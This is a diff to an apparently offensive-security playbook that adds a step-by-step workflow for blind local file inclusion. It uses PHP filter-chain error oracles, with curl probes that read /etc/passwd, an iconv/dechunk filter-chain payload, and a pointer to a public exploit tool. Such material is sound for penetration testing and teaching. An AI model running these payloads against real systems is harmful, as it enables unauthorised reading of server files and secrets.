@@ -11,8 +11,18 @@ description: Leak file contents via PHP filter chain error-based oracle using me
 - No direct file content output (blind LFI scenario)
 - Differential error responses observable (500 vs 200, different error messages)
 
-## Probe
-Exploit `convert.iconv` filter chains to cause memory exhaustion conditionally on file content:
+## Workflow
+
+### 1. Confirm php:// wrapper access
+```bash
+curl -s "https://target.com/endpoint?file=php://filter/resource=/etc/passwd"
+# vs
+curl -s "https://target.com/endpoint?file=/etc/passwd"
+```
+
+**Checkpoint:** If both return identical errors, the wrapper may be blocked. If different responses, the wrapper is processed.
+
+### 2. Exploit iconv filter chains as byte oracle
 1. Chain `convert.iconv.UTF8.UCS-4LE` filters to expand data exponentially
 2. Use `dechunk` filter as byte oracle — parses hex chars differently than non-hex
 3. If target byte is hex `[0-9a-f]`: `dechunk` processes it, chain continues → memory exhaustion → 500
@@ -23,6 +33,8 @@ Exploit `convert.iconv` filter chains to cause memory exhaustion conditionally o
 php://filter/convert.iconv.UTF8.UCS-4LE|convert.iconv.UTF8.UCS-4LE|...|dechunk/resource=/etc/passwd
 ```
 Automate with: `php_filter_chains_oracle_exploit` (github.com/synacktiv/php_filter_chains_oracle_exploit)
+
+**Checkpoint:** Verify the oracle is consistent by testing the same byte position 3 times. If responses differ across runs, network jitter or caching may interfere.
 
 ## Indicators
 - Differential response: 500 (memory limit) vs 200 for different filter chains
